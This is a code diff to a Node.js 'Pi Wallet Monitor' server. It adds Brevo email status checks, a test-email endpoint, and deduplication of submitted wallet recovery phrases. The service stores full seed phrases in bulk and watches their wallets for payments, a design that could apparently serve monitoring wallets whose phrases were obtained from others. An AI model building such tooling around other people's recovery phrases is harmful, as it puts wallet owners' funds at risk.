@@ -61,8 +61,45 @@ const PI_DERIVATION_PATH = "m/44'/314159'/0'";
 const REMINDER_24H_MS = 24 * 60 * 60 * 1000;
 const REMINDER_2H_MS = 2 * 60 * 60 * 1000;
 
-let mailerReady = !!(CONFIG.BREVO_API_KEY && CONFIG.EMAIL_FROM_ADDRESS && CONFIG.EMAIL_TO);
-if (!mailerReady) console.warn('[email] Brevo not configured — alerts disabled');
+// ═══════════════════════════ EMAIL SERVICE STATUS ═══════════════════════════
+// Tracks whether Brevo is configured, whether the API key is verified against
+// Brevo's /v3/account endpoint, and running send counters.
+
+const mailerStatus = {
+  configured: !!(CONFIG.BREVO_API_KEY && CONFIG.EMAIL_FROM_ADDRESS && CONFIG.EMAIL_TO),
+  verified: false,
+  verifiedAt: null,
+  lastError: null,
+  emailsSent: 0,
+  emailsFailed: 0,
+  lastEmailAt: null,
+  senderEmail: null,
+  planType: null,
+};
+
+if (!mailerStatus.configured) {
+  console.warn('[email] Brevo not configured — set BREVO_API_KEY, EMAIL_FROM_ADDRESS, EMAIL_TO in .env');
+}
+
+async function verifyMailer() {
+  if (!mailerStatus.configured) return;
+  try {
+    const r = await axios.get('https://api.brevo.com/v3/account', {
+      headers: { 'api-key': CONFIG.BREVO_API_KEY, 'Accept': 'application/json' },
+      timeout: 10000,
+    });
+    mailerStatus.verified = true;
+    mailerStatus.verifiedAt = new Date().toISOString();
+    mailerStatus.lastError = null;
+    mailerStatus.senderEmail = r.data?.email || null;
+    mailerStatus.planType = r.data?.plan?.[0]?.type || null;
+    console.log(`[email] Brevo verified — account=${mailerStatus.senderEmail || 'ok'} plan=${mailerStatus.planType || 'ok'}`);
+  } catch (e) {
+    mailerStatus.verified = false;
+    mailerStatus.lastError = e.response?.data?.message || e.message;
+    console.error('[email] Brevo verification failed:', mailerStatus.lastError);
+  }
+}
 
 const wallets = new Map();
 const snapshot = {};
@@ -212,6 +249,11 @@ function recomputeStats() {
     queue_depth: workQueue.length,
     stream_active: streamState.active,
     stream_last_event_ago_ms: streamState.lastEventAt ? now - streamState.lastEventAt : null,
+    email_configured: mailerStatus.configured,
+    email_verified: mailerStatus.verified,
+    email_sent: mailerStatus.emailsSent,
+    email_failed: mailerStatus.emailsFailed,
+    email_last_error: mailerStatus.lastError,
   };
   return cachedStats;
 }
@@ -229,7 +271,7 @@ function getPhrasePreview(phrase) {
 }
 
 async function sendEmail(subject, text, html) {
-  if (!mailerReady) return;
+  if (!mailerStatus.configured) return;
   try {
     await axios.post('https://api.brevo.com/v3/smtp/email', {
       sender: { name: CONFIG.EMAIL_FROM_NAME, email: CONFIG.EMAIL_FROM_ADDRESS },
@@ -241,9 +283,19 @@ async function sendEmail(subject, text, html) {
         'Content-Type': 'application/json',
         'Accept': 'application/json',
       },
+      timeout: 15000,
     });
+    mailerStatus.emailsSent++;
+    mailerStatus.lastEmailAt = new Date().toISOString();
+    // A successful send implicitly proves the key is valid
+    if (!mailerStatus.verified) {
+      mailerStatus.verified = true;
+      mailerStatus.verifiedAt = new Date().toISOString();
+    }
   } catch (e) {
-    console.error('[email] failed:', e.response?.data?.message || e.message);
+    mailerStatus.emailsFailed++;
+    mailerStatus.lastError = e.response?.data?.message || e.message;
+    console.error('[email] send failed:', mailerStatus.lastError);
   }
 }
 
@@ -662,6 +714,13 @@ app.get('/api/verify-token', authRequired, (_req, res) => {
   res.json({ success: true });
 });
 
+// Normalize a phrase for duplicate comparison: lowercase, trim, collapse whitespace.
+// BIP39 words are case-insensitive by spec, so users pasting mixed-case phrases
+// shouldn't get double-tracked.
+function normalizePhrase(p) {
+  return p.trim().toLowerCase().replace(/\s+/g, ' ');
+}
+
 app.post('/api/wallets', authRequired, (req, res) => {
   try {
     const { phrases } = req.body || {};
@@ -682,36 +741,86 @@ app.post('/api/wallets', authRequired, (req, res) => {
     }
     if (phraseList.length === 0) return res.status(400).json({ success: false, error: 'no valid phrases' });
 
-    const totalPhrases = phraseList.length;
-    console.log(`[wallets] Queued ${totalPhrases} phrases for background derivation...`);
-    res.json({ success: true, added: 0, queued: totalPhrases, total: wallets.size + totalPhrases, processing: true });
+    // ─── Duplicate filter ──────────────────────────────────────────
+    // Dedupe against existing wallets AND against duplicates within the batch.
+    const existingPhrases = new Set();
+    const existingPublicKeys = new Set();
+    for (const w of wallets.values()) {
+      existingPhrases.add(normalizePhrase(w.phrase));
+      existingPublicKeys.add(w.public_key);
+    }
+
+    const seenInBatch = new Set();
+    const uniquePhrases = [];
+    let dupInBatch = 0;
+    let dupExisting = 0;
+    for (const phrase of phraseList) {
+      const norm = normalizePhrase(phrase);
+      if (existingPhrases.has(norm)) { dupExisting++; continue; }
+      if (seenInBatch.has(norm))     { dupInBatch++;  continue; }
+      seenInBatch.add(norm);
+      uniquePhrases.push(phrase);
+    }
+
+    if (uniquePhrases.length === 0) {
+      return res.json({
+        success: true,
+        added: 0,
+        queued: 0,
+        duplicates_in_batch: dupInBatch,
+        duplicates_existing: dupExisting,
+        total: wallets.size,
+        processing: false,
+        message: 'All submitted phrases are duplicates of already-monitored wallets.',
+      });
+    }
+
+    console.log(`[wallets] Queued ${uniquePhrases.length} unique phrases (skipped ${dupExisting} already-tracked, ${dupInBatch} duplicates in batch)`);
+    res.json({
+      success: true,
+      added: 0,
+      queued: uniquePhrases.length,
+      duplicates_in_batch: dupInBatch,
+      duplicates_existing: dupExisting,
+      total: wallets.size + uniquePhrases.length,
+      processing: true,
+    });
 
     let idx = 0;
+    let addedCount = 0;
+    let pkCollisions = 0;
     const CHUNK_SIZE = 50;
     function processChunk() {
-      const end = Math.min(idx + CHUNK_SIZE, phraseList.length);
+      const end = Math.min(idx + CHUNK_SIZE, uniquePhrases.length);
       for (let i = idx; i < end; i++) {
         try {
-          const phrase = phraseList[i];
+          const phrase = uniquePhrases[i];
           const kp = deriveKeypair(phrase);
+          const pk = kp.publicKey();
+          // Guard against different valid phrases deriving to an existing public key.
+          // Extremely rare in practice but cheap to check.
+          if (existingPublicKeys.has(pk)) { pkCollisions++; continue; }
+          existingPublicKeys.add(pk);
+
           const id = crypto.randomUUID();
           wallets.set(id, {
             id,
-            label: kp.publicKey().slice(0, 8),
+            label: pk.slice(0, 8),
             phrase: phrase.trim(),
             phrase_preview: getPhrasePreview(phrase),
-            public_key: kp.publicKey(),
+            public_key: pk,
             created_at: new Date().toISOString(),
             last_payment_cursor: null,
             next_poll_at: 0,    // fire ASAP
             tier: 'urgent',
           });
+          addedCount++;
         } catch (_) { /* skip invalid phrases silently */ }
       }
       idx = end;
       cachedStats.total_wallets = wallets.size;
-      if (idx < phraseList.length) setImmediate(processChunk);
-      else console.log(`[wallets] Background derivation done. Total: ${wallets.size}`);
+      if (idx < uniquePhrases.length) setImmediate(processChunk);
+      else console.log(`[wallets] Derivation done — added=${addedCount} pk_collisions=${pkCollisions} total=${wallets.size}`);
     }
     setImmediate(processChunk);
   } catch (e) {
@@ -818,7 +927,49 @@ app.get('/api/health', (_req, res) => {
     rps: parseFloat(rateState.rps.toFixed(1)),
     throttled: rateState.backoffUntil > Date.now(),
     stream: streamState.active,
+    email: {
+      configured: mailerStatus.configured,
+      verified: mailerStatus.verified,
+      sent: mailerStatus.emailsSent,
+      failed: mailerStatus.emailsFailed,
+      last_error: mailerStatus.lastError,
+      last_sent_at: mailerStatus.lastEmailAt,
+    },
   });
+});
+
+// Manual test email — useful for confirming Brevo is wired up before you trust alerts.
+app.post('/api/test-email', authRequired, async (req, res) => {
+  if (!mailerStatus.configured) {
+    return res.status(400).json({
+      success: false,
+      error: 'Email not configured. Set BREVO_API_KEY, EMAIL_FROM_ADDRESS, EMAIL_TO in .env',
+    });
+  }
+  const subject = '✅ Pi Wallet Monitor — Test Email';
+  const text = `Test email from Pi Wallet Monitor.\nSent at: ${new Date().toISOString()}\nIf you got this, alerts are working.`;
+  const html = emailHtml({
+    icon: '✅', title: 'Test Email', accent: '#4caf50',
+    rows: [
+      { label: 'Sent At', value: new Date().toLocaleString() },
+      { label: 'Result', value: 'If you can see this, your Brevo configuration is working.' },
+      { label: 'Sender', value: CONFIG.EMAIL_FROM_ADDRESS, mono: true },
+      { label: 'Recipient', value: CONFIG.EMAIL_TO, mono: true },
+    ],
+  });
+  const before = mailerStatus.emailsSent;
+  await sendEmail(subject, text, html);
+  const succeeded = mailerStatus.emailsSent > before;
+  if (succeeded) {
+    res.json({ success: true, sent_to: CONFIG.EMAIL_TO, sender: CONFIG.EMAIL_FROM_ADDRESS });
+  } else {
+    res.status(500).json({ success: false, error: mailerStatus.lastError || 'send failed' });
+  }
+});
+
+// Email service status (useful for the dashboard footer without exposing counts on the public health).
+app.get('/api/email-status', authRequired, (_req, res) => {
+  res.json({ success: true, ...mailerStatus });
 });
 
 // ═══════════════════════════ BOOT ═══════════════════════════
@@ -827,4 +978,7 @@ app.listen(CONFIG.PORT, () => {
   console.log(`✓ Pi Wallet Monitor API listening on :${CONFIG.PORT}`);
   startScheduler();
   startPaymentStream();
+  // Verify Brevo credentials against /v3/account at boot and every hour after.
+  verifyMailer();
+  setInterval(verifyMailer, 60 * 60 * 1000);
 });
